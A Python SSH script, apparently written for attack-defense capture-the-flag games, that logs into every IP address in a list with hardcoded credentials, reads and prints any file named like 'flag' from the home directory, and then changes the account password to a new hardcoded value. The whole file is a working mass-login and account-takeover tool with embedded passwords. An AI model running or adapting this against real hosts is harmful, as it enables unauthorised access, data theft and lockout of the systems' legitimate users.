#!/usr/bin/python
#-*-coding:utf-8-*-
import paramiko
import socket


def userssh_changepwd(ip,user,old_password,new_password):
    # 建立一个sshclient对象
    ssh = paramiko.SSHClient()
    # 允许将信任的主机自动加入到host_allow 列表，此方法必须放在connect方法的前面
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=ip, port=22, username=user, password=old_password,timeout=5)
        stdin, stdout, stderr = ssh.exec_command("ls ~")
        s=str(stdout.read(),'utf-8')
        for i in s.split('\n'):
            if("flag" in i):
                command1="cat ~/%s" %(i.strip())
                stdin, stdout, stderr = ssh.exec_command(command1)
                flag=str(stdout.read(),'utf-8')
                print("%s-%s" %(ip,flag.strip()))
        command = "passwd %s\n" %(user)
        stdin, stdout, stderr = ssh.exec_command(command)
        #\n模拟回车 输两次密码
        stdin.write(old_password+'\n'+ new_password + '\n' + new_password + '\n')
        out, err = stdout.read(), stderr.read()
        #print(out)
        successful = 'password updated successfully'
        #print(out,err)
        if successful in str(err):
            print(ip + " 密码修改成功！")
        else:
            print('\033[31m错误：\033[0m' + str(err))
            print(ip + " 密码修改失败！")
        # 关闭连接
        ssh.close()
    except paramiko.ssh_exception.AuthenticationException as e:
        print(ip + ' ' + '\033[31m账号密码错误!\033[0m')
        with open('nossh.txt','a') as f:
            f.write(ip + '\n')
    except socket.timeout as e:
        print(ip + ' ' + '\033[31m连接超时！\033[0m')
        with open('timeoutssh','a') as f:
            f.write(ip + '\n')

user="bee"
old_passwd="xbwkaliwin2003"
new_passwd="xbwkaliwin2008"
with open('ip.txt','r') as f:
    for i in f.readlines():
        host=i.strip()
        userssh_changepwd(host, user, old_passwd, new_passwd)
